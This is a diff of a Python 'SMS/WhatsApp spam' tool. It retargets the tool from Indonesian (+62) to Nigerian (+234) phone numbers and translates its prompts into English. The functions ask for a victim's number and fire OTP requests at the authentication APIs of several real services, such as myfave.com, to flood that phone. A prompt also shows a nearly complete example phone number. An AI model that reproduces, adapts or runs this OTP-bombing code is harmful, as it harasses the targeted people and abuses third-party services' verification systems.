@@ -2127,8 +2127,8 @@ def process_data1():
 	
 def spam_sms():
 	global nomor 
-	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
-	nomor = input(f" [+] Input No Hp : +62").replace("+62","")
+	cetak(panel(f'''   Enter the target number you want to spam, for example : +2348138769xxx''',width=90,padding=(0,8),style=f"bold white"))
+	nomor = input(f" [+] Input No Hp : +234").replace("+234","")
 	if nomor == "":
 		pass
 	else:
@@ -2152,7 +2152,7 @@ class sxp_sms:
 				  "content-type": "application/json;charset=UTF-8"
 				},
 			json = {
-				 "phone_number": f"+62{no}"
+				 "phone_number": f"+234{no}"
 			  }
 		).text
 
@@ -2273,7 +2273,7 @@ class sxp_sms:
 						"name": aink_sanz,
 						"card_number": None,
 						"email_address": email,
-						"mobile_country_code": "+62",
+						"mobile_country_code": "+234",
 						"gender_id": "1",
 						"mobile_number": f"0{no}",
 						"mro": "",
@@ -2315,7 +2315,7 @@ class sxp_sms:
 				    "accept-encoding": "gzip, deflate, br"
 				  },
 			json = {
-				 "phoneNumber": f"+62{no}"
+				 "phoneNumber": f"+234{no}"
 				}
 		).text
 
@@ -2405,7 +2405,7 @@ class sxp_sms:
 					"Accept-Encoding": "gzip, deflate"
 				},
 			json = {
-					"phoneNum": f"62{no}",
+					"phoneNum": f"234{no}",
 					"languageCode": "id-id",
 					"countryCode": "id",
 					"platform": 2
@@ -2415,7 +2415,7 @@ class sxp_sms:
 	def sms_otp_13(self, no):
 		__req__ = self.req.post("https://api.myfave.com/api/fave/v3/auth",
 			json = {
-					"phone":"+62"+no
+					"phone":"+234"+no
 				},
 			headers = {
 					"Host": "api.myfave.com",
@@ -2483,14 +2483,14 @@ class sxp_sms:
 		self.sms_otp_12(nomor)
 		self.sms_otp_13(nomor)
 		self.sms_otp_14(nomor)
-		cetak(panel(f"Sukses Spam SMS Ke No : +62{nomor}",width=90,padding=(0,2),style=f"bold white"))
+		cetak(panel(f"Success Spam SMS To No : +234{nomor}",width=90,padding=(0,2),style=f"bold white"))
 
 #------------------[ DEFF SPAM WA ]-------------------# 
     
 def spam_wa():
 	global nomor
-	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
-	nomor = input(f" [+] Input No Hp : +62").replace("+62","")
+	cetak(panel(f'''   Enter the target number you want to spam, for example : +2348138769949''',width=90,padding=(0,8),style=f"bold white"))
+	nomor = input(f" [+] Input No Hp : +234").replace("+234","")
 	if nomor == "":
 		pass
 	else:
